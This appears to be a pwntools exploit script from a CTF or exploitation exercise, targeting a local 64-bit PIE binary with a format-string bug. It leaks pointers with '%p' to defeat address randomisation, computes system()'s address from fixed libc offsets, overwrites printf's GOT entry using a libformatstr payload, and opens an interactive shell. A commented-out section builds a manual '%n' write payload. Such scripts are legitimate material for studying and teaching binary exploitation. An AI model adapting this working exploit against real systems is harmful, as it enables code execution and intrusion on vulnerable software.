#!/usr/bin/env python

from pwn import *
import sys
sys.path.insert(0, './libformatstr/libformatstr')
from core import FormatStr

context.terminal=['tmux','splitw','-h']
p=process('./fs-code-exec-pie-64')

#p=process('./fs-code-exec-pie-6x')

#gdb.attach(p, "b main")

addr_of_printf = p.elf.got['printf']
#nul = chr(0)

#print(hex(addr_of_printf))
print(p.recv())

buf = "%p!%p!"
p.sendline(buf)

p.recvuntil("Hello ")
data = p.recvuntil("!")
ref = int(p.recvuntil("!")[:-1], 16)

#print("Address swiped: %s" % (data[:-4] + "000"))
print("Code address: %s" % (data[:-1]))
print("Ref address: %s" % hex(ref))

#addr_code = int(data[:-4] + "000", 16)
addr_code = int(data[:-1], 16)

#offset = 0x55bfdc707d11 - 0x55bfdc7074f7
offset = 2102031 #2103248

addr_got_printf = addr_code + offset
addr_system = ref-3608448-66672

print("Address of system: %s" % hex(addr_system))
print("Address with offset: %s" % hex(addr_got_printf))

p.sendline("Meme")
p.sendline(buf)

s_one   = int(hex(addr_system)[0:6], 16)
s_two   = int("0x" + hex(addr_system)[6:10], 16)
s_three = int("0x" + hex(addr_system)[10:14], 16)

d_1 = s_three
d_2 = s_two - s_three
d_3 = s_one - s_two

while (d_2 < 0):
    d_2 += 0x10000

while (d_3 < 0):
    d_3 += 0x10000

last_four_bytes = addr_system & 0xffffffff
fmt = FormatStr(isx64=1)
fmt[addr_got_printf] = last_four_bytes
payload = fmt.payload(6, start_len=0)

p.sendline(payload)

p.interactive()

#test = 0x00001234faceb00c

#print(hex(test & 0xffff) + " " + hex((test >> 16) & 0xffff) + " " + hex(test >> 32))

#exit()

"""
s_1234 = (addr_system >> 32)
s_face = (addr_system >> 16) & 0xffff
s_b00c = addr_system & 0xffff

print(hex(addr_system))
print(hex(s_1234) + " " + hex(s_face) + " " + hex(s_b00c))

payload = "%" + str(s_b00c) + "x%10$n" + "%" + str(s_face-s_b00c+0x10000) + "x%11$n" + "%" + str(s_1234-s_face) + "x%12$n"
#payload = "%" + str(s_b00c) + "x%11$n" + "%" + str(s_face-s_b00c+0x10000) + "x%12$n" + "%" + str(s_1234-s_face) + "x%13$n"
#payload = "%" + str(s_b00c) + "x%12$n" + "%" + str(s_face-s_b00c+0x10000) + "x%13$n" + "%" + str(s_1234-s_face) + "x%14$n"
l = 8-(len(payload)%8)
payload += "A"*l
payload += p64(addr_got_printf)
payload += p64(addr_got_printf+2)
payload += p64(addr_got_printf+4)

print(repr(payload))

p.sendline(payload)
print(p.recv())
p.interactive()
print(p.recv())
"""

#exit()
